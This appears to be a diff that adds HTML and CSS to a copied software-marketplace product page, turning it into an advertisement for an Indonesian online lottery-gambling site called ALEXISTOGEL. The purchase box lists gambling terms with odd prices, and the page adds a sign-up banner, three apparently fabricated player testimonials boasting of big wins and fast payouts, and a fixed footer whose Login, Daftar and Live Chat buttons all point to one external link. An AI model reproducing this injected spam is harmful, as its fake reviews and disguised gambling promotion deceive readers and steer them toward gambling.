+                                                <div class="js-purchase-heading purchase-form__price t-heading -size-xxl" bis_skin_checked="1">
+                                                    <b class="t-currency"><span
+                                                                            class="js-purchase-price">$5000</span></b>
+                                                </div>
+                                            </div>
+
+
+                                            <div class="purchase-form__license js-purchase-license is-active" data-license="regular" bis_skin_checked="1">
+                                                <price class="js-purchase-license-prices" data-price-prepaid="$37" data-license="regular" data-price-prepaid-upgrade="$46.38" data-support-upgrade-price="$9.38" data-support-upgrade-saving="$12" data-support-extension-price="$15.63" data-support-extension-saving="$6.25"
+                                                    data-support-renewal-price="$10.00">
+                                                </price>
+                                            </div>
+
+                                            <div class="purchase-form__support" bis_skin_checked="1">
+                                                <ul class="t-icon-list -font-size-s -icon-size-s -offset-flush">
+                                                    <li class="t-icon-list__item -icon-ok">
+                                                        <span class="is-visually-hidden">Included:</span> ALEXISTOGEL
+                                                    </li>
+                                                    <li class="t-icon-list__item -icon-ok">
+                                                        <span class="is-visually-hidden">Included:</span> BANDAR TOGEL 
+                                                    </li>
+                                                    <li class="t-icon-list__item -icon-ok">
+                                                        <span class="is-visually-hidden">Included:</span> TOTO TOGEL <span class="purchase-form__author-name"></span>
+                                                        <a class="t-link -decoration-reversed js-support__inclusion-link" data-view="modalAjax" href="/item_support/what_is_item_support/8988002">
+                                                            <svg width="12px" height="13px" viewBox="0 0 12 13" class="" xmlns="http://www.w3.org/2000/svg" aria-labelledby="title" role="img">
+                                                                                <title>More Info</title>
+                                                                                <path fill-rule="evenodd"
+                                                                                    clip-rule="evenodd"
+                                                                                    d="M0 6.5a6 6 0 1 0 12 0 6 6 0 0 0-12 0zm7.739-3.17a.849.849 0 0 1-.307.664.949.949 0 0 1-.716.273c-.273 0-.529-.102-.716-.272a.906.906 0 0 1-.307-.665c0-.256.102-.512.307-.682.187-.17.443-.273.716-.273.273 0 .528.102.716.273a.908.908 0 0 1 .307.682zm-.103 6.34-.119.46c-.34.137-.613.24-.818.307a2.5 2.5 0 0 1-.716.103c-.409 0-.733-.103-.954-.307a.953.953 0 0 1-.341-.767c0-.12 0-.256.017-.375.017-.12.05-.273.085-.426l.426-1.517a7.14 7.14 0 0 1 .103-.41c.017-.119.034-.238.034-.357a.582.582 0 0 0-.12-.41c-.085-.068-.238-.119-.46-.119-.12 0-.239.017-.34.051-.069.03-.132.047-.189.064-.042.012-.082.024-.119.038l.12-.46c.234-.102.468-.18.69-.253l.11-.037c.24-.085.478-.119.734-.119.409 0 .733.102.954.307.222.187.341.477.341.784 0 .068 0 .187-.017.34v.003a2.173 2.173 0 0 1-.085.458l-.427 1.534-.102.41v.002c-.017.119-.034.237-.034.356 0 .204.051.34.136.409.137.085.307.119.46.102a1.3 1.3 0 0 0 .359-.051c.085-.051.17-.085.272-.12z"
+                                                                                    fill="#0084B4"></path>
+
+                                                                            </svg>
+
+                                                        </a>
+                                                    </li>
+                                                </ul>
+
+                                                <div class="purchase-form__upgrade purchase-form__upgrade--before-after-price" bis_skin_checked="1">
+                                                    <div class="purchase-form__upgrade-checkbox purchase-form__upgrade-checkbox--before-after-price" bis_skin_checked="1">
+                                                        <input type="hidden" name="support" id="support_default" value="bundle_6month" class="js-support__default" autocomplete="off">
+                                                        <input type="checkbox" name="support" id="support" value="bundle_12month" class="js-support__option">
+                                                    </div>
+                                                    <div class="purchase-form__upgrade-info" bis_skin_checked="1">
+                                                        <label class="purchase-form__label purchase-form__label--before-after-price" for="support">
+                                                                            Extend support to 12 months
+                                                                            <span
+                                                                                class="purchase-form__price purchase-form__price--before-after-price t-heading -size-xs h-pull-right">
+                                                                                <span
+                                                                                    class="js-renewal__price t-currency purchase-form__renewal-price purchase-form__renewal-price--strikethrough">$888</span>
+
+                                                                                <b class="t-currency">
+                                                                                    <span
+                                                                                        class="js-support__price">$777</span>
+                                                                                </b>
+                                                                            </span>
+                                                                        </label>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <center><a rel="nofollow noopener" href="https://paperhall.pages.dev/">
+                                            <img src="https://kilat.digital/images/2025/06/20/e6bb4b38c5024e0607b84e6883e91158.gif" width="100%" height="auto" alt="Daftar Sekarang">
+                                             </a></center>
+                                        <div class="purchase-form__us-dollars-notice-container" bis_skin_checked="1">
+                                                            <style>
+:root{--brand:#ff0000;--brand-mid:#970000;--brand-dark:#690000;--border:#e5e7eb;--bg:#fff;--shadow:0 6px 15px rgba(0,0,0,.08);}
+.app-card{max-width:650px;margin:25px auto;background:var(--bg);border-radius:14px;overflow:hidden;box-shadow:var(--shadow);border:1px solid var(--border);transition:transform .2s,box-shadow .3s;font-family:system-ui,Arial,sans-serif;font-size:.92rem;}
+.app-card:hover{transform:translateY(-2px);box-shadow:0 10px 25px rgba(0,0,0,.12);}
+.app-header{padding:12px 16px;text-align:center;background:linear-gradient(135deg,var(--brand),var(--brand-mid),var(--brand-dark));color:#fff;font-weight:800;font-size:1.15rem;text-shadow:0 1px 2px rgba(0,0,0,.3);}
+.app-table{width:100%;border-collapse:collapse;}
+.app-table th,.app-table td{padding:8px 12px;vertical-align:middle;}
+.app-table th{width:35%;background:var(--brand-mid);color:#fff;font-weight:700;letter-spacing:.2px;border-bottom:1px solid #009297;text-transform:uppercase;font-size:.85rem;}
+.app-table td{border-bottom:1px solid var(--border);color:#1f1f1f;font-size:.9rem;}
+@media(max-width:640px){.app-table,.app-table tbody,.app-table tr,.app-table th,.app-table td{display:block;width:100%;}}
+.review-section{max-width:850px;margin:30px auto;display:flex;flex-direction:column;gap:18px;font-family:system-ui,Arial,sans-serif;}
+.review-card{background:#f5f5f5;padding:16px 20px;border-radius:10px;border-left:5px solid var(--brand);box-shadow:0 3px 6px rgba(0,0,0,.05);transition:all .25s ease-in-out;}
+.review-card:hover{transform:translateY(-3px);box-shadow:0 5px 10px rgba(0,0,0,.08);}
+.review-author{font-weight:700;color:var(--brand-dark);margin-bottom:4px;display:flex;align-items:center;gap:6px;font-size:.92rem;}
+.review-author::before{content:"👤";font-size:1rem;}
+.review-card p{margin:0;color:#222;font-size:.94rem;line-height:1.6;}
+/* JANGAN warnai .review-rating, biar pseudo-element yang atur warna */
+.review-rating{margin-left:auto;font-weight:700}
+
+/* ⭐ STAR SYSTEM (mendukung 4.8/4.9) */
+.stars{
+  --rating:5;              /* fallback */
+  --star-size:1rem;
+  --star-gap:2px;
+  --star-empty:#e5e7eb;
+  --star-fill:#f4c430;
+  position:relative;
+  display:inline-block;
+  font-size:var(--star-size);
+  line-height:1;
+  letter-spacing:var(--star-gap);
+}
+.stars::before{
+  content:"★★★★★";
+  color:var(--star-empty);
+}
+.stars::after{
+  content:"★★★★★";
+  color:var(--star-fill);
+  position:absolute;left:0;top:0;
+  width:calc((var(--rating)/5)*100%);
+  overflow:hidden;white-space:nowrap;pointer-events:none;
+}
+.stars.lg{--star-size:1.1rem;letter-spacing:3px}
+.badge{display:inline-flex;align-items:center;gap:8px;flex-wrap:wrap}
+.badge small{color:#555;font-weight:600}
+</style>
+
+<h2 style="font-weight:bold; text-align:center;">Testimoni Pemain Setia ALEXISTOGEL</h2>
+<div class="review-section">
+  <div class="review-card">
+    <div class="review-author">
+      Satria, Jakarta
+   
+      <span class="review-rating stars" style="--rating:5" aria-label="Rating 5.0 dari 5"></span>
+    </div>
+    <p style="text-align: justify;">Saya sudah bermain di banyak situs togel online, tapi baru di Alexistogel saya merasa benar-benar puas. Hadiah besar, proses transaksi cepat, dan yang paling penting, keamanannya terjamin. Hasil keluaran sangat transparan, dan customer service selalu siap membantu. Bener-bener pengalaman bermain yang menyenangkan!</p>
+  </div>
+
+  <div class="review-card">
+    <div class="review-author">
+      Dewi, Surabaya
+      <span class="review-rating stars" style="--rating:4.8" aria-label="Rating 4.8 dari 5"></span>
+    </div>
+    <p style="text-align: justify;">Alexistogel adalah situs togel online terbaik yang pernah saya coba. Pasarannya lengkap, mulai dari Macau hingga Singapore, dan peluang menangnya tinggi. Saya sudah beberapa kali menang besar, dan proses penarikannya sangat cepat. Pokoknya, saya selalu merasa aman dan nyaman bermain di sini!</p>
+  </div>
+
+  <div class="review-card">
+    <div class="review-author">
+      Andi, Bali
+      <span class="review-rating stars" style="--rating:4.9" aria-label="Rating 4.9 dari 5"></span>
+    </div>
+    <p style="text-align: justify;">Bergabung di Alexistogel adalah keputusan terbaik saya. Semua hasil togel sangat akurat dan transparan. Selain itu, bonusnya juga menarik, dan saya merasa dihargai sebagai member. Pelayanan customer service yang selalu siap membantu 24 jam juga menjadi nilai tambah. Saya sangat merekomendasikan Alexistogel kepada teman-teman!</p>
+  </div>
+</div>               
+<style>
+    .alexistogel-fixed-footer {
+            display: flex;
+            justify-content: space-around;
+            position: fixed;
+            background: linear-gradient(to bottom, rgb(255 0 0) 0%, rgb(164 42 42) 50%, rgb(0, 38, 25) 100%);
+            box-shadow: inset 2px 2px 2px 0px rgb(146, 0, 0), 7px 7px 20px 0px rgb(167, 0, 0), 4px 4px 5px 0px rgba(0, 38, 25);
+            outline: none;
+            padding: 5px 0;
+            box-shadow: 0 0 2px 2px rgb(104, 72, 72);
+            left: 0;
+            right: 0;
+            bottom: 0;
+            z-index: 99;
+            border-radius: 40px 40px 0px 0px;
+            border-style:dashed;
+            
+        }
+
+        .alexistogel-fixed-footer a {
+            flex-basis: calc((100% - 15px*6)/ 5);
+            text-decoration: none;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: #fcfbfb;
+            max-width: 75px;
+            font-size: 12px;
+            font-family: Ubuntu, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
+        }
+
+        .alexistogel-fixed-footer a:hover {
+            font-weight: bold;
+        }
+
+        .alexistogel-fixed-footer .center {
+            transform: scale(1.5) translateY(-5px);
+            background: center no-repeat;
+            background-size: contain;
+            background-color: inherit;
+            border-radius: 50%;
+        }
+
+        .alexistogel-fixed-footer img {
+            max-width: 20px;
+            margin-bottom: 0;
+            max-height: 20px;
+        }
+</style>
+<div class="alexistogel-fixed-footer">
+    <a href="https://paperhall.pages.dev/" rel="nofollow noopener" target="_blank">
+        <img layout="intrinsic" height="20px" width="20px" src="https://kilat.digital/images/2023/12/13/067a6dbaedf867ecca980a732729ed54.png" alt="BONUS ALEXISTOGEL">
+        Promo
+
+    </a>
+    <a href="https://paperhall.pages.dev/" rel="nofollow noopener" target="_blank">
+        <img layout="intrinsic" height="20px" width="20px" src="https://kilat.digital/images/2023/12/13/067a6dbaedf867ecca980a732729ed54.png" alt="LOGIN ALEXISTOGEL">
+        Login
+    </a>
+    <a href="https://paperhall.pages.dev/" rel="nofollow noopener" target="_blank" class="tada">
+        <img layout="intrinsic" height="20px" width="20px" src="https://kilat.digital/images/2023/12/13/067a6dbaedf867ecca980a732729ed54.png" alt="DAFTAR ALEXISTOGEL">
+        Daftar
+    </a>
+    <a href="https://paperhall.pages.dev/" rel="nofollow noopener" target="_blank">
+        <img layout="intrinsic" height="20px" width="20px" src="https://kilat.digital/images/2023/12/13/067a6dbaedf867ecca980a732729ed54.png" alt="WHATSAPP ALEXISTOGEL">
+        Whatsapp
+    </a>
+    <a href="https://paperhall.pages.dev/" rel="nofollow noopener" target="_blank"
+        class="js_live_chat_link live-chat-link">
+        <img class="live-chat-icon" layout="intrinsic" height="20px" width="20px" src="https://kilat.digital/images/2023/12/13/067a6dbaedf867ecca980a732729ed54.png"
+            alt="LIVE CHAT ALEXISTOGEL">
+        Live Chat
+    </a>
+</div>
+
+</body>
+</html>
